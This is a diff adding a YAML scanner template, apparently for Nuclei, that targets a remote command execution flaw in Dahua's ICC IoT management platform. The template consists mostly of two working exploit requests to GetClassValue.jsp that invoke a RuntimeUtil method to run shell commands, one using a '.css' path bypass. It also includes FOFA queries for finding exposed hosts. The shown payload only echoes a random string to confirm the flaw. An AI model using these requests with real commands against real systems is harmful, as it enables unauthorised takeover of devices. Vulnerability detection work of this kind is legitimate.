@@ -1,0 +1,42 @@
+id: dahua-icc-GetClassValue-rce
+info:
+  name: 大华 icc 智能物联综合管理平台 GetClassValue.jsp - rce
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/aqz58oV5TUes7ofUXewXXg
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="static/fontshd/font-hd.css" || body="客户端会小于800"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,rce,dahua,icc,iot
+
+http:
+  - raw:
+      - |
+        POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"data": {"clazzName": "com.dahua.admin.util.RuntimeUtil", "methodName": "syncexecReturnInputStream", "fieldName": ["echo {{randstr}}"]}}}
+
+      - |
+        POST /evo-apigw/admin/API/Developer/./GetClassValue.css HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"data": {"clazzName": "com.dahua.admin.util.RuntimeUtil", "methodName": "syncexecReturnInputStream", "fieldName": ["echo {{randstr}}"]}}}
+    
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'{{randstr}}')
+        condition: and
